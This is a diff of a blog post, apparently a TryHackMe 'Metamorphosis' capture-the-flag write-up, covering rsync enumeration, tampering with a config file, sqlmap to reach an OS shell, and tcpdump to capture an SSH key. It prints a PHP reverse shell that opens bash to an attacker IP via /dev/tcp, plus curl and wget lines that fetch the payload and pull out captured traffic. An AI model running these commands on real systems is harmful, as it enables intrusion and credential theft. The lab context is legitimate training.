@@ -3,13 +3,13 @@ title: "Tryhackme Metamorphosis"
 date: 2021-08-16T15:55:27+05:30
 draft: true
 toc: true
-image: ""
-tags: []
-categories: []
+image: "images/github-pagesLightBlue.jpeg"
+tags: ["blog", "GitHub Pages" ,"Hugo"]
+categories: ["blog"]
 ---
 
 ## Overview
-<img style="border:2px solid black" src="/images/metamorphosis.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/metamorphosis.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
 
 ## Recon
 
@@ -90,22 +90,17 @@ Progress: 56672 / 882244 (6.42%)
 
 ### Visting Webpage
 
-```bash
-http://10.10.97.133/admin
-
-```
-
-<img style="border:2px solid black" src="/images/forbidden.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/forbidden.png" align="left"><br><br><br><br><br><br><br>
 
 
 Viewing `source code` 
 
-<img style="border:2px solid black" src="/images/sourcecode.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/sourcecode.png" align="left"><br><br><br><br>
 
 
-### Rsync Enumeration
+## Rsync Enumeration
 
-We have port 873 running which is `Rsync` you can read more about this here[hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)
+We have port 873 running which is `Rsync` you can read more about this here [hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)
 
 ```bash
 rsync -rdt rsync://10.10.38.244:873
@@ -156,7 +151,7 @@ password = theCat
 Local = No
 ````
 
-The env variable is set to `prod`  .... change this to `dev` (for development)and uploading back the new webapp.ini file to server.
+The env variable is set to `prod` ... change this to `dev` (for development) and upload back new `webapp.ini` file to `server`.
 
 ```bash
 
@@ -167,10 +162,9 @@ rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini
 Going to the admin page again  `http://10.10.101.93/admin/`
 
 
-<img style="border:2px solid black" src="/images/2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br>
  
 Use `brupsuite` and save the request as `req.txt` file
-
 
 ## SQLmap
 
@@ -178,7 +172,7 @@ Use `brupsuite` and save the request as `req.txt` file
 sqlmap -r req.txt --level 3 --risk 3 --batch --os-shell
 
 ```
-<img style="border:2px solid black" src="/images/sqloutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/sqloutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br>
 
 
 ## Getting Reverse Shell
@@ -191,48 +185,48 @@ root@kali:~/tryhackme/metamorphosis#cat shell.php
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/your IP/1234 0>&1'");
 ```
+In `Os-shell`
 
-In Os-shell 
+```bash
 curl http://your IP/shell.php -o shell.php
+```
 
 access the shell.php in browser using `http://10.10.101.93/shell.php/`
 
 and ` nc -lnvp 1234 ` in other terminal 
 
-we get the `Rev shell`.
+Get the `Rev shell` and `Upgrade`.
 
-<img style="border:2px solid black" src="/images/revshell.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/revshell.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
   
 Getting  `User.txt`
 
-<img style="border:2px solid black" src="/images/user_txt.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/user_txt.png" align="left"><br><br><br><br><br><br><br><br><br><br><br>
  
 ## Privilege Escalation
 
-Running `linpeas` we get the user can run `Tcpdump`
+Running `linpeas` we get that user can run `Tcpdump`
 
 Running `Pspy64` we get
 
-<img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br><br><br><br>
 
-It shows root runnign req.sh but we can run this in terminal ..
+It shows root run `req.sh` and 	`sudo -l` not give any information
 
-Now finally run tcpdump in one terminal and pspy64 in other ... and capture the output using wget ...............
+Now finally run tcpdump in /var/www/html and capture the output using wget ...............
 
-<img style="border:2px solid black" src="/images/tcpdump.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/tcpdump.png" align="left"><br><br><br><br><br><br><br><br><br>
 
-<img style="border:2px solid black" src="/images/pspy2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-
-In local machine run `wget http://machine Ip/1.pcap
+In Attakcer Machine run `wget http://10.10.101.93/1.pcap`
 
 Open 1.pcap file in `Wireshark`
 
 follow tcp stream and get the SSH key
 
-<img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br>
 
 log in with key and get `root.txt`
 
-<img style="border:2px solid black" src="/images/root.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<img style="border:2px solid black" src="/images/root.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
 
 
